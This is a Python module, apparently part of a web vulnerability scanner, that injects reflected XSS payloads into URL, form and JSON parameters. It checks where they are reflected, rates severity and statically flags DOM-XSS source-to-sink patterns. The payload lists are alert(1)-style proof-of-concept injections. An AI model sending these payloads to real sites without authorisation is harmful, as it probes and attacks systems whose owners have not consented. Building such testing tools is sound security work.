# xss_part.py — XSS phases & helpers

import re
import time
import html
import urllib.parse as urllib_parse
from urllib.parse import urlparse, urlencode, urlunparse, urljoin
from copy import deepcopy
from bs4 import BeautifulSoup
import requests

# --- Basic reflected XSS payloads ---
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '";alert(1);//',
    "';alert(1);//",
    "</script><script>alert(1)</script>",
    '" autofocus onfocus=alert(1) x="'
]

# Phase 8: Context-specific XSS payloads
CTX_XSS_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ],
    "attr": [
        "\"><script>alert(1)</script>",
        '" autofocus onfocus=alert(1) x="'
    ],
    "js": [
        '";alert(1);//',
        "';alert(1);//",
        "</script><script>alert(1)</script>"
    ]
}

# Phase 9: Smart payloads
XSS_SMART_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]

XSS_KEY_PARTS = [
    "script", "onerror", "onload", "alert",
    "<img", "<svg", "<iframe", "srcdoc", "javascript:"
]

HTML_ENCODE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#", "&amp;"]

# -------------------------
# Auto-verify XSS
# -------------------------
def auto_verify_xss(method, url, param_name, original_params, post_data, headers,
                    request_with_timeout, json_body=None, json_key=None):
    token = f"INJ_TOKEN_{int(time.time())}"
    payload = f"<script>console.log('{token}')</script>"

    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body); jb[json_key] = payload
        r = request_with_timeout(method, url, headers=headers, json_body=jb)
    else:
        parsed = urlparse(url)
        params_copy = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        params_copy[key] = [payload]
        q = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))

        if method.upper() == "POST" and post_data and key in post_data:
            pd = deepcopy(post_data); pd[key] = payload
            r = request_with_timeout("POST", url, data=pd, headers=headers)
        else:
            r = request_with_timeout("GET" if method.upper() == "GET" else "POST", new_url, data=post_data, headers=headers)

    if not r:
        return False
    text = r.text or ""
    return (payload in text) or (token in text)


# -------------------------
# Phase 8: Context-aware XSS
# -------------------------
def detect_xss_context(html_text: str, marker: str):
    if not html_text or marker not in html_text:
        return None
    idx = html_text.find(marker)
    if idx == -1:
        return None

    open_idx = html_text.rfind("<script", 0, idx)
    close_idx = html_text.rfind("</script", 0, idx)
    if open_idx != -1 and (close_idx == -1 or close_idx < open_idx):
        return "js"

    window = 120
    start = max(0, idx - window)
    end = min(len(html_text), idx + window)
    snippet = html_text[start:end]

    attr_re = re.compile(
        r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker) + r".*?\1",
        re.DOTALL | re.IGNORECASE
    )
    if attr_re.search(snippet):
        return "attr"

    return "html"

def run_context_aware_xss_phase(method, url, params, headers, json_body, post_data,
                                base_status, base_text, verbose, fingerprint,
                                request_with_timeout, _single_injection_attempt, log=print):
    findings = []
    method = method.upper()
    if method != "GET" or not params or json_body is not None:
        return findings

    parsed = urlparse(url)

    for param_name, values in params.items():
        marker = f"CTX_XSS_{param_name}_{int(time.time() * 1000)}"

        new_params = deepcopy(params)
        new_params[param_name] = [marker]
        query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
        marker_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

        r = request_with_timeout(method, marker_url, headers=headers)
        if not r or r.status_code >= 500:
            continue

        body = r.text or ""
        if marker not in body:
            continue

        ctx = detect_xss_context(body, marker)
        if verbose:
            log(f"[CTX-XSS] {url} param '{param_name}' marker reflected in context={ctx}")

        payloads = CTX_XSS_PAYLOADS.get(ctx, [])
        for pl in payloads:
            f = _single_injection_attempt(
                method=method,
                url=url,
                param_name=param_name,
                original_params=params,
                base_text=base_text,
                base_status=base_status,
                payload=pl,
                post_data=post_data,
                headers=headers,
                json_body=None,
                json_key=None,
                verbose=verbose,
                fingerprint=fingerprint
            )
            if f:
                extra = f.get("extra") or {}
                extra["xss_context"] = ctx
                f["extra"] = extra
                findings.append(f)

    return findings


# -------------------------
# Phase 9: Advanced Reflected XSS
# -------------------------
def index_to_line_col(text: str, idx: int):
    line = text.count("\n", 0, idx) + 1
    last_nl = text.rfind("\n", 0, idx)
    if last_nl == -1:
        col = idx + 1
    else:
        col = idx - last_nl
    return line, col

def detect_reflection_context_adv(text: str, idx: int) -> str:
    window_before = text[max(0, idx - 80):idx].lower()
    window_after = text[idx:idx + 80].lower()

    if '="' in window_before or "='" in window_before:
        return "HTML Attribute"
    if "<script" in window_before:
        return "JavaScript Context"
    if "<" in window_before and ">" in window_after:
        return "HTML Tag Body"
    if "href=" in window_before or "src=" in window_before:
        return "URL / Attribute"
    return "Unknown"

def find_reflections_for_payload(payload: str, response_text: str):
    results = []
    if response_text is None:
        return results

    layers = [
        ("raw", response_text),
        ("html_unescape", html.unescape(response_text)),
        ("url_unquote+html_unescape", html.unescape(urllib_parse.unquote(response_text)))
    ]

    for layer_name, text in layers:
        if not text:
            continue

        start_idx = text.find(payload)
        if start_idx != -1:
            line, col = index_to_line_col(text, start_idx)
            ctx = detect_reflection_context_adv(text, start_idx)
            encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
            results.append({
                "match_type": "exact",
                "layer": layer_name,
                "payload": payload,
                "matched_string": payload,
                "line": line,
                "column": col,
                "context": ctx,
                "html_encoded": encoded
            })

        text_low = text.lower()
        for key in XSS_KEY_PARTS:
            key_low = key.lower()
            idx = text_low.find(key_low)
            if idx != -1:
                line, col = index_to_line_col(text, idx)
                ctx = detect_reflection_context_adv(text, idx)
                encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
                results.append({
                    "match_type": "partial",
                    "layer": layer_name,
                    "payload": payload,
                    "matched_string": key,
                    "line": line,
                    "column": col,
                    "context": ctx,
                    "html_encoded": encoded
                })

    return results

def guess_xss_severity_from_context(context: str) -> str:
    ctx = (context or "").lower()
    if "javascript" in ctx:
        return "high"
    if "attribute" in ctx or "url" in ctx:
        return "medium"
    return "low"

def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw, fingerprint,
                                    request_with_timeout, compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()
    if not params:
        return findings

    parsed = urlparse(url)
    base_len = len(base_text_raw or "")

    for param_name, values in params.items():
        original_value = values[0] if values else ""

        for payload in XSS_SMART_PAYLOADS:
            test_params = deepcopy(params)
            test_params[param_name] = [f"{original_value}{payload}"]
            query = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            resp = request_with_timeout(method, inj_url, headers=headers)
            if not resp:
                continue

            body = resp.text or ""
            reflections = find_reflections_for_payload(payload, body)
            if not reflections:
                continue

            best = sorted(reflections, key=lambda r: 0 if r["match_type"] == "exact" else 1)[0]
            ctx = best["context"]
            severity = guess_xss_severity_from_context(ctx)

            if severity == "high":
                base_conf = 50
                score_delta = 45
            elif severity == "medium":
                base_conf = 40
                score_delta = 35
            else:
                base_conf = 30
                score_delta = 25

            verify_result = {
                "verified": True,
                "evidence": f"Reflected XSS payload at line {best['line']}, column {best['column']} in {ctx}",
                "score_delta": score_delta,
                "elapsed": 0.0
            }

            score = compute_score(base_confidence=base_conf, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
            status_label = "confirmed" if score >= 50 else ("probable" if score >= 30 else "low")

            finding = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": inj_url,
                "method": method,
                "injected_param": param_name,
                "payload": payload,
                "vuln_type": "Reflected XSS",
                "reason": verify_result["evidence"],
                "status_code": resp.status_code,
                "auto_verified": True,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": status_label,
                "base_len": base_len,
                "resp_len": len(body or ""),
                "extra": {
                    "xss_match_type": best["match_type"],
                    "xss_layer": best["layer"],
                    "xss_context": ctx,
                    "xss_line": best["line"],
                    "xss_column": best["column"],
                    "xss_html_encoded": best["html_encoded"],
                    "xss_matched_string": best["matched_string"],
                }
            }

            if verbose:
                log(f"[XSS-REFLECTED][{severity.upper()}] {url} param={param_name} ctx={ctx} payload={payload}")

            findings.append(finding)
            break

    return findings


# -------------------------
# Phase 10: DOM XSS static analysis
# -------------------------
DOM_XSS_SOURCES = [
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"localStorage",
    r"sessionStorage",
    r"window\.name"
]

DOM_XSS_SINKS = [
    r"innerHTML",
    r"outerHTML",
    r"document\.write",
    r"document\.writeln",
    r"insertAdjacentHTML",
    r"eval\(",
    r"setTimeout\(",
    r"setInterval\(",
    r"Function\(",
    r"\.html\("
]

DOM_SRC_RES = [re.compile(p) for p in DOM_XSS_SOURCES]
DOM_SINK_RES = [re.compile(p) for p in DOM_XSS_SINKS]

def _analyze_js_for_dom_xss(js_code: str, script_id: str, script_url: str = None):
    results = []
    if not js_code:
        return results

    lines = js_code.splitlines()
    for idx, line in enumerate(lines, start=1):
        line_stripped = line.strip()
        if not line_stripped:
            continue

        has_src = []
        has_sink = []

        for sre in DOM_SRC_RES:
            if sre.search(line_stripped):
                has_src.append(sre.pattern)

        for kre in DOM_SINK_RES:
            if kre.search(line_stripped):
                has_sink.append(kre.pattern)

        if has_src and has_sink:
            results.append({
                "script_id": script_id,
                "script_url": script_url,
                "line_no": idx,
                "line": line_stripped[:300],
                "sources": has_src,
                "sinks": has_sink
            })

    return results

def _collect_scripts_from_html(base_url: str, html_text: str, TIMEOUT: int, headers=None):
    scripts = []
    try:
        soup = BeautifulSoup(html_text, "html.parser")
    except Exception:
        return scripts

    inline_idx = 0
    for s in soup.find_all("script"):
        src = s.get("src")
        if src:
            continue
        code = s.string or ""
        if not code or not code.strip():
            continue
        inline_idx += 1
        scripts.append({"code": code, "id": f"inline_{inline_idx}", "url": None})

    for s in soup.find_all("script", src=True):
        src = s.get("src")
        if not src:
            continue
        js_url = urljoin(base_url, src)
        try:
            resp = requests.get(js_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            continue
        if not resp or resp.status_code != 200:
            continue
        code = resp.text or ""
        if not code.strip():
            continue
        scripts.append({"code": code, "id": f"external::{src}", "url": js_url})

    return scripts

def run_dom_xss_phase(url, base_html, TIMEOUT, headers=None, fingerprint=None,
                      compute_score=None, log=print, now_ts=None, verbose=False):
    findings = []
    if not base_html:
        return findings

    scripts = _collect_scripts_from_html(url, base_html, TIMEOUT, headers=headers)
    if not scripts:
        return findings

    for sc in scripts:
        code = sc["code"]
        sid = sc["id"]
        surl = sc["url"]

        raw_hits = _analyze_js_for_dom_xss(code, sid, script_url=surl)
        for h in raw_hits:
            reason = (
                "Potential DOM-based XSS: source(s) "
                + ", ".join(h["sources"])
                + " flowing into sink(s) "
                + ", ".join(h["sinks"])
                + f" at line {h['line_no']} in script {h['script_id']}"
            )

            verify_result = {"verified": False, "evidence": "static JS pattern (source→sink) only",
                             "score_delta": 0, "elapsed": 0.0}

            score = 35
            if compute_score:
                score = compute_score(base_confidence=35, fingerprint=fingerprint, verify_result=verify_result, payload=None)

            finding = {
                "timestamp": now_ts() if now_ts else "",
                "url": url,
                "test_url": url,
                "method": "GET",
                "injected_param": "[DOM_ANALYSIS]",
                "payload": "[DOM_ANALYSIS]",
                "vuln_type": "DOM XSS (client-side)",
                "reason": reason,
                "status_code": None,
                "auto_verified": False,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "probable" if score >= 30 else "low",
                "base_len": len(base_html or ""),
                "resp_len": len(base_html or ""),
                "extra": {
                    "dom_script_id": h["script_id"],
                    "dom_script_url": h["script_url"],
                    "dom_line_no": h["line_no"],
                    "dom_line_snippet": h["line"],
                    "dom_sources": h["sources"],
                    "dom_sinks": h["sinks"]
                }
            }

            if verbose:
                log(f"[DOM-XSS] {url} script={h['script_id']} line={h['line_no']}")

            findings.append(finding)

    return findings
